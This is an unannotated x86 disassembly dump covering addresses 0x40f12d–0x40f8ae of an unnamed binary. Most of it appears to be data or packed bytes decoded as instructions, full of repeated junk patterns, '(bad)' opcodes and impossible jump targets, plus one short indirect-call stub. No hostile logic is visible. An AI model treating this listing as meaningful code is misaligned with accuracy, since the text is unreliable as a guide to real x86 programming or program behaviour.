  40f12d:	add    BYTE PTR [eax+0x78],al
  40f130:	inc    ecx
  40f131:	add    BYTE PTR [eax+0x41],bl
  40f134:	bound  ebp,QWORD PTR [edx]
  40f136:	bound  ebp,QWORD PTR [eax+edi*4+0x24]
  40f13a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f13b:	jbe    0x40f15b
  40f13d:	adc    DWORD PTR [eax+0x2a],eax
  40f140:	jle    0x40f1ae
  40f142:	mov    ebx,0xb4b41225
  40f147:	fs cmp eax,0x299f9838
  40f14d:	inc    ebx
  40f14e:	cmp    eax,0x29430bf9
  40f153:	addr16 adc al,0x5d
  40f156:	ret    
  40f157:	mov    ds:0x61a0c538,al
  40f15c:	and    esp,0x844064b4
  40f162:	add    ah,cl
  40f164:	bound  eax,QWORD PTR ds:0xcc840f41
  40f16a:	inc    ebx
  40f16b:	add    BYTE PTR [eax+0x0],al
  40f16e:	inc    eax
  40f16f:	inc    eax
  40f170:	inc    eax
  40f171:	int3   
  40f172:	add    BYTE PTR ds:0x62404341,al
  40f178:	pop    eax
  40f179:	add    BYTE PTR [ebx+0x40],al
  40f17c:	bound  ecx,QWORD PTR [edi]
  40f17e:	inc    eax
  40f17f:	enter  0x8bd0,0x61
  40f183:	inc    ebx
  40f184:	sub    BYTE PTR ds:0xe4248b6,al
  40f18a:	loope  0x40f10c
  40f18c:	cmp    ecx,ecx
  40f18e:	and    WORD PTR [ecx],dx
  40f191:	into   
  40f192:	inc    esi
  40f193:	add    DWORD PTR [ecx],esp
  40f195:	xchg   ecx,eax
  40f196:	mov    al,ds:0xcc18375c
  40f19b:	int3   
  40f19c:	int3   
  40f19d:	int3   
  40f19e:	int3   
  40f19f:	int3   
  40f1a0:	push   ebp
  40f1a1:	mov    ebp,esp
  40f1a3:	mov    edx,0x4076d0
  40f1a8:	mov    DWORD PTR ds:0x4253db,ebp
  40f1ae:	add    edx,eax
  40f1b0:	call   edx
  40f1b2:	push   0x425281
  40f1b7:	call   0x420161
  40f1bc:	ret    
  40f1bd:	int3   
  40f1be:	int3   
  40f1bf:	int3   
  40f1c0:	mov    eax,ds:0x15454740
  40f1c5:	jmp    0x40f1c7
  40f1c7:	add    BYTE PTR [eax+0x40],al
  40f1ca:	cmovno eax,DWORD PTR ds:0x40056243
  40f1d1:	int3   
  40f1d2:	add    ah,cl
  40f1d4:	inc    eax
  40f1d5:	inc    eax
  40f1d6:	bound  eax,QWORD PTR [ecx+0x0]
  40f1d9:	add    BYTE PTR [edi],cl
  40f1db:	inc    ebx
  40f1dc:	inc    eax
  40f1dd:	inc    eax
  40f1de:	add    BYTE PTR [ecx+0x43],al
  40f1e1:	add    eax,0x40256240
  40f1e6:	bound  eax,QWORD PTR [eax]
  40f1e8:	sub    BYTE PTR [esi+0x46cc605a],ah
  40f1ee:	inc    edi
  40f1ef:	mov    cl,0x4
  40f1f1:	or     edx,esp
  40f1f3:	sbb    eax,0x63ced868
  40f1f8:	inc    ebx
  40f1f9:	lods   eax,DWORD PTR ds:[esi]
  40f1fa:	das    
  40f1fb:	add    edx,edi
  40f1fd:	enter  0x7915,0x40
  40f201:	push   ds
  40f202:	dec    edx
  40f203:	icebp  
  40f204:	inc    ebx
  40f205:	inc    esi
  40f206:	cli    
  40f207:	jo     0x40f22d
  40f209:	retf   0x15a1
  40f20c:	in     eax,0x39
  40f20e:	pushf  
  40f20f:	arpl   WORD PTR [eax+edx*8+0x34],bp
  40f213:	add    BYTE PTR [eax+0x45],ch
  40f216:	dec    ecx
  40f217:	inc    ebx
  40f218:	shl    BYTE PTR [ebx+eiz*8],cl
  40f21b:	and    DWORD PTR [eax+0x19],edx
  40f21e:	add    eax,0x4140cc00
  40f223:	inc    eax
  40f224:	inc    ebx
  40f225:	bound  esp,QWORD PTR ds:0x41400043
  40f22b:	add    BYTE PTR [eax],al
  40f22d:	add    eax,0x43624062
  40f232:	inc    ecx
  40f233:	inc    eax
  40f234:	inc    eax
  40f235:	inc    eax
  40f236:	add    eax,0x40624340
  40f23b:	add    eax,0x40664140
  40f240:	xlat   BYTE PTR ds:[ebx]
  40f241:	in     al,dx
  40f242:	inc    ebx
  40f243:	pop    ss
  40f244:	lds    edx,FWORD PTR ds:0x679aa1a8
  40f24a:	lds    ebx,FWORD PTR [ebx+0x62128323]
  40f250:	dec    ecx
  40f251:	pushf  
  40f252:	imul   ebp,DWORD PTR [edx-0x49],0xfffffff5
  40f256:	dec    eax
  40f257:	and    DWORD PTR [ebp+0x51aaa115],esi
  40f25d:	add    al,BYTE PTR [ecx-0x38]
  40f260:	cwde   
  40f261:	leave  
  40f262:	pop    ebp
  40f263:	jae    0x40f206
  40f265:	adc    eax,0xac6662ec
  40f26a:	pop    esp
  40f26b:	push   cs
  40f26c:	cmp    BYTE PTR [eax+0x40],al
  40f26f:	mov    eax,0xc9281579
  40f274:	mov    eax,ds:0x66156260
  40f279:	inc    edx
  40f27a:	add    BYTE PTR [eax+0x36],al
  40f27d:	inc    ebx
  40f27e:	add    BYTE PTR ds:0x41107840,al
  40f284:	bound  eax,QWORD PTR [eax+0x40]
  40f287:	sldt   WORD PTR [eax-0x34]
  40f28b:	js     0x40f2ef
  40f28d:	add    eax,0x40664143
  40f292:	inc    ebx
  40f293:	add    BYTE PTR [ecx+0x5],al
  40f296:	js     0x40f2d8
  40f298:	bound  eax,QWORD PTR [eax+0x0]
  40f29b:	inc    eax
  40f29c:	leave  
  40f29d:	add    al,0xcd
  40f29f:	xchg   esi,eax
  40f2a0:	pop    esi
  40f2a1:	inc    ebx
  40f2a2:	inc    eax
  40f2a3:	loope  0x40f2b3
  40f2a5:	adc    al,0x5a
  40f2a7:	or     eax,0x544040c8
  40f2ac:	icebp  
  40f2ad:	push   ebx
  40f2ae:	inc    ecx
  40f2af:	jmp    0x23451754
  40f2b4:	(bad)  
  40f2b5:	int    0x13
  40f2b7:	cmp    ah,BYTE PTR [eax+0x6c]
  40f2ba:	inc    eax
  40f2bb:	push   esi
  40f2bc:	dec    eax
  40f2bd:	bound  edi,QWORD PTR [eax+0x54]
  40f2c0:	mov    eax,ds:0x856440ec
  40f2c5:	test   DWORD PTR [edx-0x7],esp
  40f2c8:	gs inc ebx
  40f2ca:	inc    eax
  40f2cb:	xor    ecx,DWORD PTR [ecx+0x5c]
  40f2ce:	inc    ecx
  40f2cf:	inc    ebx
  40f2d0:	inc    eax
  40f2d1:	inc    eax
  40f2d2:	add    eax,0x434162
  40f2d7:	inc    eax
  40f2d8:	add    BYTE PTR [edx+0x5],ah
  40f2db:	inc    eax
  40f2dc:	adc    BYTE PTR [edx+0x40],ah
  40f2df:	inc    ebx
  40f2e0:	inc    ecx
  40f2e1:	add    eax,0x4340
  40f2e6:	add    eax,0x404162
  40f2eb:	add    BYTE PTR [eax+0x43],al
  40f2ee:	inc    eax
  40f2ef:	add    eax,0xc55e9448
  40f2f4:	or     al,0x65
  40f2f6:	add    BYTE PTR [eax+0x37e8e6c8],cl
  40f2fc:	inc    eax
  40f2fd:	and    DWORD PTR [eax],ebp
  40f2ff:	fisttp DWORD PTR [ebx]
  40f301:	push   ss
  40f302:	xchg   esp,eax
  40f303:	out    0x12,eax
  40f305:	dec    edx
  40f306:	dec    ebx
  40f307:	fcomp  DWORD PTR ds:0x409a0556
  40f30d:	add    BYTE PTR fs:[edx+0x71],ah
  40f311:	xchg   edx,eax
  40f312:	xchg   DWORD PTR [ebp-0x56db44eb],esp
  40f318:	arpl   WORD PTR ds:0x41000040,dx
  40f31e:	inc    ebx
  40f31f:	add    eax,0x41784062
  40f324:	inc    eax
  40f325:	inc    eax
  40f326:	add    BYTE PTR [edi],cl
  40f328:	bound  eax,QWORD PTR [ebx+0x0]
  40f32b:	add    eax,0x25006240
  40f330:	inc    eax
  40f331:	add    eax,0x40254143
  40f336:	add    eax,0x65620000
  40f33b:	sub    BYTE PTR [eax+0x10],al
  40f33e:	daa    
  40f33f:	lods   al,BYTE PTR ds:[esi]
  40f340:	add    eax,0x6e7c6f66
  40f345:	and    al,BYTE PTR [edx+0x62c2d84e]
  40f34b:	inc    ebx
  40f34c:	inc    eax
  40f34d:	and    ebp,DWORD PTR [ebp-0x6]
  40f350:	bound  esp,QWORD PTR [eax+ecx*4+0x40]
  40f354:	push   cs
  40f355:	dec    ecx
  40f356:	sub    ah,BYTE PTR [edi+0x6e]
  40f359:	cli    
  40f35a:	mul    BYTE PTR [eax+eax*2]
  40f35d:	mov    ds:0x435d0d,al
  40f362:	add    BYTE PTR [eax],al
  40f364:	inc    ecx
  40f365:	inc    eax
  40f366:	bound  esp,QWORD PTR [esi+0x0]
  40f369:	inc    eax
  40f36a:	add    eax,0x5400000
  40f36f:	inc    ecx
  40f370:	inc    eax
  40f371:	inc    eax
  40f372:	bound  esp,QWORD PTR ds:0x25050043
  40f378:	inc    ecx
  40f379:	inc    ebx
  40f37a:	inc    eax
  40f37b:	test   BYTE PTR [eax+0x0],al
  40f37e:	bound  ebx,QWORD PTR [eax+0x62]
  40f381:	inc    ecx
  40f382:	inc    eax
  40f383:	xor    eax,0xf6c4f90
  40f388:	and    eax,DWORD PTR [ebx-0x6fb63f24]
  40f38e:	xchg   BYTE PTR [eax+0x4f],al
  40f391:	dec    esi
  40f392:	fs inc edi
  40f394:	test   BYTE PTR [ecx+0x43],0x9
  40f398:	loopne 0x40f3aa
  40f39a:	bound  eax,QWORD PTR [eax+0x41]
  40f39d:	and    eax,0x40000500
  40f3a2:	inc    ebx
  40f3a3:	add    eax,0x40624041
  40f3a8:	inc    ebx
  40f3a9:	add    eax,0x43402541
  40f3ae:	bound  eax,QWORD PTR [eax+0x43]
  40f3b1:	int3   
  40f3b2:	inc    eax
  40f3b3:	bound  eax,QWORD PTR [eax]
  40f3b5:	inc    ecx
  40f3b6:	inc    eax
  40f3b7:	inc    eax
  40f3b8:	add    eax,0x40fc0205
  40f3bd:	and    ebp,eax
  40f3bf:	lds    eax,FWORD PTR [eax+0x28]
  40f3c2:	and    ah,BYTE PTR [ebx+0x4e]
  40f3c5:	stc    
  40f3c6:	fcomp  st(7)
  40f3c8:	adc    al,0x74
  40f3ca:	inc    edi
  40f3cb:	inc    ebx
  40f3cc:	mov    ah,0x8e
  40f3ce:	rol    BYTE PTR ds:0xfc826a40,0x3d
  40f3d5:	adc    ecx,DWORD PTR [ebx+0x68]
  40f3d8:	add    esp,DWORD PTR [edi]
  40f3da:	cmp    BYTE PTR [ecx-0x3f],ch
  40f3dd:	pop    ss
  40f3de:	sub    eax,0x622a407d
  40f3e3:	inc    eax
  40f3e4:	and    eax,0x5406600
  40f3e9:	inc    ebx
  40f3ea:	inc    ecx
  40f3eb:	inc    eax
  40f3ec:	inc    eax
  40f3ed:	inc    ebx
  40f3ee:	add    BYTE PTR [eax],al
  40f3f0:	add    BYTE PTR [edx-0x34],ah
  40f3f3:	inc    eax
  40f3f4:	add    eax,0x40004041
  40f3f9:	inc    ecx
  40f3fa:	int3   
  40f3fb:	add    BYTE PTR [ebx-0x7c],al
  40f3fe:	add    eax,0x5406240
  40f403:	(bad)  
  40f404:	iret   
  40f405:	inc    ebx
  40f406:	mov    ah,0x65
  40f408:	sbb    eax,0x491528
  40f40d:	lock add eax,0x4078a8f8
  40f413:	mov    eax,ds:0x8cc96873
  40f418:	adc    al,BYTE PTR [ebx+0x12]
  40f41b:	jo     0x40f45d
  40f41d:	stos   BYTE PTR es:[edi],al
  40f41e:	inc    eax
  40f41f:	bound  ebx,QWORD PTR [eax+0x41]
  40f422:	add    eax,0x40404340
  40f427:	inc    ebx
  40f428:	inc    eax
  40f429:	test   BYTE PTR [eax],al
  40f42b:	add    eax,0x40624041
  40f430:	inc    eax
  40f431:	add    BYTE PTR [edx+0x5],ah
  40f434:	inc    ebx
  40f435:	add    BYTE PTR [eax+0x78],al
  40f438:	inc    ecx
  40f439:	add    BYTE PTR [eax+0x41],bl
  40f43c:	bound  ecx,QWORD PTR [ecx+0x15]
  40f43f:	dec    eax
  40f440:	inc    eax
  40f441:	inc    eax
  40f442:	loop   0x40f3d8
  40f444:	mov    BYTE PTR [ecx],bl
  40f446:	jmp    0x40f489
  40f448:	and    al,0x14
  40f44a:	test   eax,0x47a06371
  40f44f:	ins    BYTE PTR es:[di],dx
  40f451:	inc    eax
  40f452:	dec    edi
  40f453:	inc    eax
  40f454:	inc    ecx
  40f455:	bound  edx,QWORD PTR [esp+edx*1-0x60]
  40f459:	adc    eax,DWORD PTR [eax-0x5bd5386]
  40f45f:	fs inc ebx
  40f461:	inc    eax
  40f462:	adc    DWORD PTR [edi+eax*2-0x2c],ecx
  40f466:	inc    eax
  40f467:	test   BYTE PTR [eax],al
  40f469:	int3   
  40f46a:	bound  eax,QWORD PTR ds:0xcc840f41
  40f470:	inc    ebx
  40f471:	add    BYTE PTR [eax+0x0],al
  40f474:	inc    eax
  40f475:	inc    eax
  40f476:	inc    eax
  40f477:	int3   
  40f478:	add    BYTE PTR ds:0x62404341,al
  40f47e:	pop    eax
  40f47f:	add    BYTE PTR [ebx+0x40],al
  40f482:	bound  ecx,QWORD PTR [edi]
  40f484:	inc    eax
  40f485:	mov    BYTE PTR [ecx-0x3b],cl
  40f488:	push   cs
  40f489:	add    BYTE PTR [eax-0x139c2f58],0xe7
  40f490:	inc    eax
  40f491:	or     eax,0x1e51103a
  40f496:	imul   eax,ebx,0xb4eddb09
  40f49c:	xor    esp,DWORD PTR [ebx+0x4c]
  40f49f:	add    BYTE PTR [eax],al
  40f4a1:	inc    eax
  40f4a2:	inc    eax
  40f4a3:	cmovno eax,DWORD PTR ds:0x40056243
  40f4aa:	int3   
  40f4ab:	add    ah,cl
  40f4ad:	inc    eax
  40f4ae:	inc    eax
  40f4af:	bound  eax,QWORD PTR [ecx+0x0]
  40f4b2:	add    BYTE PTR [edi],cl
  40f4b4:	inc    ebx
  40f4b5:	inc    eax
  40f4b6:	inc    eax
  40f4b7:	add    BYTE PTR [ecx+0x43],al
  40f4ba:	add    eax,0x40256240
  40f4bf:	bound  eax,QWORD PTR [eax]
  40f4c1:	leave  
  40f4c2:	inc    eax
  40f4c3:	mov    cl,0x2
  40f4c5:	inc    ecx
  40f4c6:	jl     0x40f44e
  40f4c8:	int    0x4
  40f4ca:	pop    ds
  40f4cb:	stos   DWORD PTR es:[edi],eax
  40f4cc:	ins    DWORD PTR es:[edi],dx
  40f4cd:	pop    esp
  40f4ce:	test   al,0x4a
  40f4d0:	test   eax,0x5f844028
  40f4d5:	lods   al,BYTE PTR ds:[esi]
  40f4d6:	inc    eax
  40f4d7:	mov    eax,ds:0x97147463
  40f4dc:	add    eax,0x8842a53
  40f4e1:	inc    ebx
  40f4e2:	inc    eax
  40f4e3:	mov    eax,ds:0x15415d55
  40f4e8:	test   al,0x59
  40f4ea:	adc    dh,dl
  40f4ec:	dec    edx
  40f4ed:	std    
  40f4ee:	add    ah,BYTE PTR [eax+0x10]
  40f4f1:	pushf  
  40f4f2:	inc    eax
  40f4f3:	add    eax,DWORD PTR [eax+0x48cec444]
  40f4f9:	add    eax,0x4140cc00
  40f4fe:	inc    eax
  40f4ff:	inc    ebx
  40f500:	bound  esp,QWORD PTR ds:0x41400043
  40f506:	add    BYTE PTR [eax],al
  40f508:	add    eax,0x43624062
  40f50d:	inc    ecx
  40f50e:	inc    eax
  40f50f:	inc    eax
  40f510:	inc    eax
  40f511:	add    eax,0x40624340
  40f516:	add    eax,0x40664140
  40f51b:	pop    ebp
  40f51c:	sbb    DWORD PTR [ebx+edi*2],ecx
  40f51f:	fsub   DWORD PTR [edx+0x5c]
  40f522:	inc    ecx
  40f523:	in     al,0x40
  40f525:	xchg   DWORD PTR [eax-0x31],eax
  40f528:	sbb    al,0xfa
  40f52a:	and    dh,BYTE PTR [ebx+0x4304de12]
  40f530:	in     al,0x82
  40f532:	sar    BYTE PTR [edx-0x28f76c0],1
  40f538:	bound  ebp,QWORD PTR [edx+0x62]
  40f53b:	inc    ebx
  40f53c:	add    esi,DWORD PTR [esi]
  40f53e:	inc    eax
  40f53f:	push   0x40050043
  40f544:	js     0x40f556
  40f546:	inc    ecx
  40f547:	bound  eax,QWORD PTR [eax+0x40]
  40f54a:	sldt   WORD PTR [eax-0x34]
  40f54e:	js     0x40f5b2
  40f550:	add    eax,0x40664143
  40f555:	inc    ebx
  40f556:	add    BYTE PTR [ecx+0x5],al
  40f559:	js     0x40f59b
  40f55b:	bound  eax,QWORD PTR [eax+0x0]
  40f55e:	inc    eax
  40f55f:	cmp    DWORD PTR [edx],eax
  40f561:	inc    eax
  40f562:	mov    BYTE PTR [eax-0x7f],0x0
  40f566:	cdq    
  40f567:	xor    al,0x66
  40f569:	sub    dl,BYTE PTR [edi]
  40f56b:	add    eax,0xb8c07846
  40f570:	xor    BYTE PTR [ecx+esi*4],0x40
  40f574:	add    BYTE PTR [ecx+0x43],0x40
  40f578:	inc    eax
  40f579:	add    eax,0x434162
  40f57e:	inc    eax
  40f57f:	add    BYTE PTR [edx+0x5],ah
  40f582:	inc    eax
  40f583:	adc    BYTE PTR [edx+0x40],ah
  40f586:	inc    ebx
  40f587:	inc    ecx
  40f588:	add    eax,0x4340
  40f58d:	add    eax,0x404162
  40f592:	add    BYTE PTR [eax+0x43],al
  40f595:	inc    eax
  40f596:	add    eax,0x65056240
  40f59b:	adc    bh,BYTE PTR [ebx]
  40f59d:	add    al,0x2d
  40f59f:	arpl   WORD PTR [eax+0x2b624187],bp
  40f5a5:	inc    eax
  40f5a6:	add    eax,ebp
  40f5a8:	add    eax,0x2843663b
  40f5ad:	inc    eax
  40f5ae:	add    al,BYTE PTR [eax-0x35]
  40f5b1:	inc    ecx
  40f5b2:	(bad)  
  40f5b3:	cmp    al,0x70
  40f5b5:	inc    eax
  40f5b6:	cmp    eax,0x6502507a
  40f5bb:	outs   dx,DWORD PTR ds:[esi]
  40f5bc:	inc    ebx
  40f5bd:	inc    eax
  40f5be:	daa    
  40f5bf:	push   ecx
  40f5c0:	adc    eax,0x406c41c0
  40f5c5:	inc    eax
  40f5c6:	push   esp
  40f5c7:	add    bl,cl
  40f5c9:	data16 pop bx
  40f5cc:	and    al,0xc
  40f5ce:	add    DWORD PTR [edi],ebp
  40f5d0:	inc    eax
  40f5d1:	add    BYTE PTR [eax],al
  40f5d3:	inc    ecx
  40f5d4:	inc    ebx
  40f5d5:	add    eax,0x41784062
  40f5da:	inc    eax
  40f5db:	inc    eax
  40f5dc:	add    BYTE PTR [edi],cl
  40f5de:	bound  eax,QWORD PTR [ebx+0x0]
  40f5e1:	add    eax,0x25006240
  40f5e6:	inc    eax
  40f5e7:	add    eax,0x40254143
  40f5ec:	add    eax,0x48620000
  40f5f1:	inc    esp
  40f5f2:	cld    
  40f5f3:	(bad)  [eax+eax*2+0x37]
  40f5f7:	push   0xffffffc9
  40f5f9:	ins    BYTE PTR es:[edi],dx
  40f5fa:	or     eax,0x850d5440
  40f5ff:	add    ch,BYTE PTR [ecx+edi*1+0x4043f841]
  40f606:	and    al,0x23
  40f608:	inc    esi
  40f609:	ret    
  40f60a:	ret    0xc59b
  40f60d:	adc    al,0x83
  40f60f:	inc    ebp
  40f610:	or     ch,BYTE PTR [esi]
  40f612:	sub    DWORD PTR [ecx+edx*4+0x43],eax
  40f619:	inc    ecx
  40f61a:	inc    eax
  40f61b:	bound  esp,QWORD PTR [esi+0x0]
  40f61e:	inc    eax
  40f61f:	add    eax,0x5400000
  40f624:	inc    ecx
  40f625:	inc    eax
  40f626:	inc    eax
  40f627:	bound  esp,QWORD PTR ds:0x25050043
  40f62d:	inc    ecx
  40f62e:	inc    ebx
  40f62f:	inc    eax
  40f630:	test   BYTE PTR [eax+0x0],al
  40f633:	bound  ebx,QWORD PTR [eax+0x62]
  40f636:	inc    ecx
  40f637:	inc    eax
  40f638:	inc    eax
  40f639:	pop    ds
  40f63a:	add    DWORD PTR [eax+ebp*4+0x801caf9],eax
  40f641:	mov    DWORD PTR [ebx+eiz*2],edi
  40f644:	and    al,0xfa
  40f646:	mov    bh,ch
  40f648:	inc    eax
  40f649:	add    DWORD PTR [edx+0x63052a57],eax
  40f64f:	xchg   ebx,eax
  40f650:	outs   dx,BYTE PTR ds:[esi]
  40f651:	sbb    DWORD PTR [ebx-0x42],ebp
  40f654:	inc    edx
  40f655:	inc    ecx
  40f656:	pop    ebx
  40f657:	sub    BYTE PTR [eax-0x3a],al
  40f65a:	cmp    DWORD PTR ds:0x41406210,esi
  40f660:	and    eax,0x40000500
  40f665:	inc    ebx
  40f666:	add    eax,0x40624041
  40f66b:	inc    ebx
  40f66c:	add    eax,0x43402541
  40f671:	bound  eax,QWORD PTR [eax+0x43]
  40f674:	int3   
  40f675:	inc    eax
  40f676:	bound  eax,QWORD PTR [eax]
  40f678:	inc    ecx
  40f679:	inc    eax
  40f67a:	inc    eax
  40f67b:	add    eax,0xe0630805
  40f680:	ins    BYTE PTR es:[edi],dx
  40f681:	push   cs
  40f682:	or     DWORD PTR [eax+0x45],eax
  40f685:	cmp    al,0xc0
  40f687:	inc    edx
  40f688:	inc    ebx
  40f689:	inc    eax
  40f68a:	pop    edx
  40f68b:	xor    al,0xd4
  40f68d:	arpl   WORD PTR [ebx+0x3c],sp
  40f690:	inc    eax
  40f691:	jno    0x27f19cfd
  40f697:	stc    
  40f698:	and    al,0x40
  40f69a:	aas    
  40f69b:	xor    DWORD PTR [ecx],0x6c5b110d
  40f6a1:	bound  eax,QWORD PTR [eax+0x25]
  40f6a4:	add    BYTE PTR [esi+0x40],ah
  40f6a7:	add    eax,0x40404143
  40f6ac:	inc    ebx
  40f6ad:	add    BYTE PTR [eax],al
  40f6af:	add    BYTE PTR [edx-0x34],ah
  40f6b2:	inc    eax
  40f6b3:	add    eax,0x40004041
  40f6b8:	inc    ecx
  40f6b9:	int3   
  40f6ba:	add    BYTE PTR [ebx-0x7c],al
  40f6bd:	add    eax,0x5406240
  40f6c2:	bound  ecx,QWORD PTR [ecx]
  40f6c4:	inc    ecx
  40f6c5:	inc    ecx
  40f6c6:	sar    DWORD PTR [ebp-0xf],0x81
  40f6ca:	outs   dx,BYTE PTR ds:[esi]
  40f6cb:	inc    eax
  40f6cc:	add    BYTE PTR [eax],0x3a
  40f6cf:	bound  ebp,QWORD PTR [ecx+0x29]
  40f6d2:	inc    ebx
  40f6d3:	adc    al,0x33
  40f6d5:	and    bh,ah
  40f6d7:	jbe    0x40f6bc
  40f6d9:	adc    al,ch
  40f6db:	inc    eax
  40f6dc:	add    eax,0x98706250
  40f6e1:	in     eax,0xc4
  40f6e3:	add    edx,DWORD PTR [ebp+0x56620480]
  40f6e9:	and    eax,DWORD PTR es:[eax+0x2b]
  40f6ed:	bound  ecx,QWORD PTR [eax]
  40f6ef:	and    esi,esp
  40f6f1:	mov    ah,0xd6
  40f6f3:	adc    eax,0x62405a03
  40f6f8:	pop    eax
  40f6f9:	inc    ecx
  40f6fa:	add    eax,0x40404340
  40f6ff:	inc    ebx
  40f700:	inc    eax
  40f701:	test   BYTE PTR [eax],al
  40f703:	add    eax,0x40624041
  40f708:	inc    eax
  40f709:	add    BYTE PTR [edx+0x5],ah
  40f70c:	inc    ebx
  40f70d:	add    BYTE PTR [eax+0x78],al
  40f710:	inc    ecx
  40f711:	add    BYTE PTR [eax+0x41],bl
  40f714:	bound  edx,QWORD PTR [edx+0x40]
  40f717:	adc    ah,ch
  40f719:	dec    edx
  40f71a:	inc    eax
  40f71b:	jbe    0x40f75d
  40f71d:	adc    ah,BYTE PTR [ebp-0x37]
  40f720:	lds    ebp,FWORD PTR [eax]
  40f722:	adc    cl,BYTE PTR [ebp+0x6650a87d]
  40f728:	inc    ebx
  40f729:	push   0x15c14140
  40f72e:	popa   
  40f72f:	inc    eax
  40f730:	sub    al,0x43
  40f732:	adc    al,0x1
  40f734:	or     ch,0xfd
  40f737:	inc    eax
  40f738:	xchg   ecx,eax
  40f739:	inc    eax
  40f73a:	inc    eax
  40f73b:	dec    ebp
  40f73c:	and    DWORD PTR [ecx-0x7d],eax
  40f73f:	inc    edx
  40f740:	test   al,0x24
  40f742:	adc    eax,DWORD PTR [ebx]
  40f744:	pusha  
  40f745:	xlat   BYTE PTR ds:[ebx]
  40f746:	sbb    eax,0x406c10cf
  40f74b:	pusha  
  40f74c:	sub    BYTE PTR [eax],0x3
  40f74f:	test   eax,0x8440b8
  40f754:	int3   
  40f755:	bound  eax,QWORD PTR ds:0xcc840f41
  40f75b:	inc    ebx
  40f75c:	add    BYTE PTR [eax+0x0],al
  40f75f:	inc    eax
  40f760:	inc    eax
  40f761:	inc    eax
  40f762:	int3   
  40f763:	add    BYTE PTR ds:0x62404341,al
  40f769:	pop    eax
  40f76a:	add    BYTE PTR [ebx+0x40],al
  40f76d:	bound  ecx,QWORD PTR [edi]
  40f76f:	inc    eax
  40f770:	or     BYTE PTR [esi],cl
  40f772:	add    DWORD PTR [ebx],esp
  40f774:	jnp    0x40f7f0
  40f776:	mov    al,0x41
  40f778:	inc    ebx
  40f779:	inc    eax
  40f77a:	inc    DWORD PTR [edx-0x74]
  40f77d:	fs inc ebx
  40f77f:	jl     0x40f746
  40f781:	or     DWORD PTR [esi+0x0],esp
  40f784:	or     edx,esi
  40f786:	jno    0x40f7cc
  40f788:	out    dx,eax
  40f789:	inc    eax
  40f78a:	add    al,0x36
  40f78c:	test   BYTE PTR [eax+0x1f516788],ch
  40f792:	adc    ebp,DWORD PTR [edx+0x11]
  40f795:	mov    edi,0x40fc5464
  40f79a:	jle    0x40f76e
  40f79c:	pop    edx
  40f79d:	sub    dl,BYTE PTR [eax+0x6462]
  40f7a3:	inc    eax
  40f7a4:	inc    eax
  40f7a5:	cmovno eax,DWORD PTR ds:0x40056243
  40f7ac:	int3   
  40f7ad:	add    ah,cl
  40f7af:	inc    eax
  40f7b0:	inc    eax
  40f7b1:	bound  eax,QWORD PTR [ecx+0x0]
  40f7b4:	add    BYTE PTR [edi],cl
  40f7b6:	inc    ebx
  40f7b7:	inc    eax
  40f7b8:	inc    eax
  40f7b9:	add    BYTE PTR [ecx+0x43],al
  40f7bc:	add    eax,0x40256240
  40f7c1:	bound  eax,QWORD PTR [eax]
  40f7c3:	adc    al,0x4
  40f7c5:	sub    BYTE PTR ds:0x284d80ac,0x40
  40f7cc:	xor    al,0x7c
  40f7ce:	cmp    bl,cl
  40f7d0:	arpl   WORD PTR fs:[eax+edx*1+0x16],sp
  40f7d5:	and    DWORD PTR [eax],ebx
  40f7d7:	adc    eax,0x4043757e
  40f7dc:	adc    BYTE PTR [ecx+0x24004463],0x40
  40f7e3:	sbb    DWORD PTR [edx],esi
  40f7e5:	pop    ds
  40f7e6:	test   BYTE PTR [esi+0x5],bh
  40f7e9:	add    ah,cl
  40f7eb:	inc    eax
  40f7ec:	inc    ecx
  40f7ed:	inc    eax
  40f7ee:	inc    ebx
  40f7ef:	bound  esp,QWORD PTR ds:0x41400043
  40f7f5:	add    BYTE PTR [eax],al
  40f7f7:	add    eax,0x43624062
  40f7fc:	inc    ecx
  40f7fd:	inc    eax
  40f7fe:	inc    eax
  40f7ff:	inc    eax
  40f800:	add    eax,0x40624340
  40f805:	add    eax,0x40664140
  40f80a:	dec    ebp
  40f80b:	and    BYTE PTR [eax+eax*2],0x2d
  40f80f:	test   DWORD PTR [ebx-0x7c],eax
  40f812:	push   eax
  40f813:	and    BYTE PTR [edx+edx*1+0x4],ch
  40f817:	sbb    cl,BYTE PTR ds:0x22fe0c64
  40f81d:	inc    eax
  40f81e:	or     DWORD PTR [ebx-0x52b0e598],ecx
  40f824:	inc    ebx
  40f825:	add    ebp,edx
  40f827:	aad    0x59
  40f829:	and    al,0xdd
  40f82b:	out    dx,eax
  40f82c:	lds    eax,FWORD PTR [eax+0x25]
  40f82f:	add    BYTE PTR [ebx+0x6c],0x4c
  40f833:	(bad)  
  40f835:	add    eax,0x5004301
  40f83a:	inc    eax
  40f83b:	js     0x40f84d
  40f83d:	inc    ecx
  40f83e:	bound  eax,QWORD PTR [eax+0x40]
  40f841:	sldt   WORD PTR [eax-0x34]
  40f845:	js     0x40f8a9
  40f847:	add    eax,0x40664143
  40f84c:	inc    ebx
  40f84d:	add    BYTE PTR [ecx+0x5],al
  40f850:	js     0x40f892
  40f852:	bound  eax,QWORD PTR [eax+0x0]
  40f855:	inc    eax
  40f856:	das    
  40f857:	or     eax,0xed7a60b4
  40f85c:	inc    eax
  40f85d:	pop    ss
  40f85e:	dec    ecx
  40f85f:	push   0x5
  40f861:	je     0x40f833
  40f863:	rol    BYTE PTR [ecx+eax*4],cl
  40f866:	add    cl,dh
  40f868:	or     BYTE PTR [eax+0x6040a310],dl
  40f86e:	std    
  40f86f:	push   esp
  40f870:	jle    0x40f81d
  40f872:	nop
  40f873:	sub    BYTE PTR [eax+0x3],al
  40f876:	outs   dx,DWORD PTR ds:[esi]
  40f877:	bound  esp,QWORD PTR [edx+0x1]
  40f87a:	out    dx,eax
  40f87b:	pusha  
  40f87c:	inc    eax
  40f87d:	or     BYTE PTR [eax-0x3c],al
  40f880:	sbb    DWORD PTR [edx+ebx*8+0x43],edx
  40f884:	adc    al,0x3
  40f886:	jl     0x40f865
  40f888:	mov    al,ds:0x40404b41
  40f88d:	dec    esp
  40f88e:	inc    ecx
  40f88f:	inc    ebx
  40f890:	inc    eax
  40f891:	inc    eax
  40f892:	add    eax,0x434162
  40f897:	inc    eax
  40f898:	add    BYTE PTR [edx+0x5],ah
  40f89b:	inc    eax
  40f89c:	adc    BYTE PTR [edx+0x40],ah
  40f89f:	inc    ebx
  40f8a0:	inc    ecx
  40f8a1:	add    eax,0x4340
  40f8a6:	add    eax,0x404162
  40f8ab:	add    BYTE PTR [eax+0x43],al
  40f8ae:	inc    eax
